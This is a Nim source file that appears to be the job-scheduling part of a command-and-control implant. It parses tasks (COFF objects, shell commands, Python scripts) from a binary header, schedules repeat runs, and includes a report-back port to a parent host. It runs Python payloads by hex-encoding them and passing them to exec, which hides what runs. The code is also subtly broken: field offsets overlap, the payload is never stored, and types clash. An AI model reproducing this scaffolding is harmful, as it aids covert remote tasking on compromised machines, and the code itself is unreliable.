
import osproc, strutils, streams
import strutils
import std/locks

type JobType = enum
    COFF = 0
    SHELL_CMD = 1
    SHELL_SCRIPT = 2
    PYTHON_SCRIPT = 3

type Job = object
    job_id: string
    job_type: JobType
    first_exec_time: int # timestamp of first execution
    exec_time: int # timestamp of current next execution
    repeat: bool # whether it should execute repeatedly or just once
    active: bool # whether the job has completely finished executing
    interval: int # number of seconds between each execution
    # whether and where (port on parent) to send output data from the process
    report_back: bool # whether it should report back
    report_back_port: int # port on parent host it should send
    data: seq[uint8] # the data (usually code) to execute

# serialized job data structure:
# [length (2 bytes)] || [job type (1 byte)] || [job id (36 bytes)]
# [first exec 4 bytes] || [repeat 1 byte] || [interval exec time 2 bytes]
# [report back bool 1 byte] || [report back port 2 bytes] || [data remaining bytes]
# header is 49 bytes
proc deserialize_job(data: seq[uint8]): Job =
    let data_length: int = (data[0].int shl 8) or data[1].int
    let job_type: JobType = data[2].int
    let job_id: string = data[3..39]
    var first_exec_time: int = 0
    for i in 0..<4:
        first_exec_time = (first_exec_time shl 8) or data[39 + i]
    let repeat: bool = (data[43] != 0)
    var interval: int = (data[44].int shl 8) or data[45].int
    let report_back: bool = (data[46] != 0)
    var report_back_port: int = (data[47].int shl 8) or data[48].int

    var job: Job = Job(job_id: job_id, job_type: job_type, first_exec_time: first_exec_time, exec_time: first_exec_time, repeat: repeat, interval: interval, report_back: report_back, report_back_port: report_back_port)
    return job

proc check_schedule(self: var Job) =
    let EPOCH = getTime().toUnix().uint64
    if not self.active:
        return
    if self.exec_time <= EPOCH:
        self.exec_time += self.interval
        self.execute()

# this sucks, i can do better, but i'm doing the jonathan blow and taking it slow :))
proc execute(self: var Job) =
    if not self.repeat:
        self.active = false
    if self.job_type == JobType.PYTHON_SCRIPT:
        var hex_string: string = ""
        for c in self.data:
            hex_string.add(toHex(c, 2))
        discard execProcess("python3", args=["-c","exec(bytes.fromhex('" & hex_string &"').decode())"])

export Job, JobType, deserialize_job
